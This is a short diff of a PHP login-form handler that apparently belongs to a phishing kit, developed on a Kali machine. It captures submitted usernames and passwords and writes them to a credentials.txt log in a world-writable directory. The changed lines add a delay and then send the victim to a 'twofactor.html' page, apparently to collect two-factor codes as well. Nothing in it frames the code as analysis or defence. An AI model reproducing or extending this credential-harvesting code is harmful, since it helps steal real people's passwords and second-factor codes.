@@ -5,12 +5,11 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $password = htmlspecialchars($_POST['password']);
 
     // Define the path to the credentials file
-    $directory = "/home/kali/Clifty/logs/";
-    $file_path = $directory . "credentials.txt";
+    $file_path = "/home/kali/Clifty/logs/credentials.txt";
 
     // Ensure the directory exists
-    if (!file_exists($directory)) {
-        mkdir($directory, 0777, true);
+    if (!file_exists('/home/kali/Clifty/logs/')) {
+        mkdir('/home/kali/Clifty/logs/', 0777, true);
     }
 
     // Save the credentials to the file
@@ -22,8 +21,9 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         error_log("Unable to open file: " . $file_path);
     }
 
-    // Redirect to a success page or back to the login page
-    header("Location: success.html");
+    // Delay for 3 seconds and then redirect to the 2FA page
+    sleep(3);
+    header("Location: twofactor.html");
     exit();
 }
 ?>
